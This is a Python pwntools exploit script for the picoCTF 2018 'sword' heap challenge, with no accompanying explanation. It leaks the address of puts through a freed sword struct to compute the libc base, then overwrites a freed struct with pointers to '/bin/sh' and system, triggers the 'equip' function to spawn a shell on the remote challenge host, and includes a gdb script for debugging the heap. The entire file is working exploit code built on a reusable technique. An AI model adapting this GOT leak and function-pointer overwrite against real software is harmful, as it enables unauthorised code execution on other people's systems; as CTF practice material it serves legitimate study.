#! /usr/bin/env python
#
from pwn import context, p64, u64, log, process, remote, args
from pwn import gdb, ELF
context.clear(arch='amd64', os='linux')


class Attack:
    def __init__(self, host, port, elf_name, libc_name, gdb_script=None):
        self.host, self.port = host, port
        self.elf_name, self.libc_name = elf_name, libc_name
        self.gdb_script = gdb_script

        self.elf = ELF(self.elf_name)
        self.libc = ELF(self.libc_name)

        self.p = None


    def get_process(self, ld_preload=False):
        p = None
        if args.REMOTE:
            p = remote(self.host, self.port)
        else:
            env = {'LD_PRELOAD': './%s' % self.libc_name} if ld_preload else None
            p = process('./%s' % self.elf_name, env=env)
            if args.GDB:
                gdb.attach(p.pid, self.gdb_script)
        return p


    def create_sword(self, ):
        self.p.sendlineafter('Quit.\n', '1')
        self.p.recvuntil('index is ')
        idx = self.p.recv(1)
        idx = int(idx)
        return idx


    def show_sword(self, index):
        self.p.sendlineafter('Quit.\n', '3')
        self.p.sendlineafter('?\n', str(index))
        self.p.recvuntil('The name is ')
        leak = self.p.recv(6)  # at least 6 byte address on amd64 system
        leak = leak.ljust(8, '\x00')
        leak = u64(leak)
        return leak


    def free_sword(self, index):
        self.p.sendlineafter('Quit.\n', '4')
        self.p.sendlineafter('?\n', str(index))


    def harden_sword(self, index, length, sword_name, weight=-1):
        self.p.sendlineafter('Quit.\n', '5')
        self.p.sendlineafter('?\n', str(index))
        self.p.sendlineafter('?\n', str(length))
        self.p.sendlineafter('.\n', sword_name)
        self.p.sendlineafter('?\n', str(weight))


    def equip_sword(self, index):
        self.p.sendlineafter('Quit.\n', '6')
        self.p.sendlineafter('?\n', str(index))


    def exploit(self):
        elf = self.elf
        libc = self.libc
        libc.symbols['/bin/sh'] = 0x0018cd57

        with self.get_process() as self.p:
            # -- stage 1 ---------------------------------------------------------------

            idx = self.create_sword()

            # pretending printf, but got null in its address
            payload  = 'A' * 8
            payload += p64(elf.got['puts'])
            BUF_LEN  = 256
            payload += 'A' * (BUF_LEN - 1 - len(payload))

            assert('\n' not in payload)
            self.harden_sword(idx, BUF_LEN, payload)
            self.free_sword(idx)

            idx1 = self.create_sword()
            idx2 = self.create_sword()

            ADDR_puts = self.show_sword(idx2)
            libc.address = ADDR_puts - libc.symbols['puts']
            ADDR_bin_sh = libc.symbols['/bin/sh']
            ADDR_system = libc.symbols['system']
            log.info("puts @ plt : %s", hex(ADDR_puts))
            log.info('libc       : %s', hex(libc.address))
            log.info('bin_sh     : %s', hex(ADDR_bin_sh))
            log.info('system     : %s', hex(ADDR_system))

            self.harden_sword(idx2, BUF_LEN, '')
            self.harden_sword(idx1, BUF_LEN, '')

            self.free_sword(idx2)
            self.free_sword(idx1)

            # -- stage 2 ---------------------------------------------------------------

            idx3 = self.create_sword()

            payload = 'A' * 8
            payload += p64(ADDR_bin_sh)
            payload += p64(ADDR_system)
            payload += 'A' * (BUF_LEN - 1 - len(payload))
            assert('\n' not in payload)
            self.harden_sword(idx3, BUF_LEN, payload)
            self.free_sword(idx3)

            idx4 = self.create_sword()
            idx5 = self.create_sword()

            self.equip_sword(idx5)

            self.p.clean()
            self.p.sendline('ls -la')
            self.p.interactive()


if __name__ == "__main__":
    host, port = '2018shell2.picoctf.com', 43469
    elf_name, libc_name = 'sword', 'libc.so.6'
    gdb_script = r"""
b 95
b 177
c

printf "--- sword_lists ------------------------------------\n"
p sword_lists
set $sword0=sword_lists[0].sword
set $sword1=sword_lists[1].sword
printf "--- heap mapping -----------------------------------\n"
x/32xg $sword0
printf "--- string of sword1 -------------------------------\n"
x/s $sword1->sword_name

c
"""
    attack = Attack(host, port , elf_name, libc_name, gdb_script)
    attack.exploit()
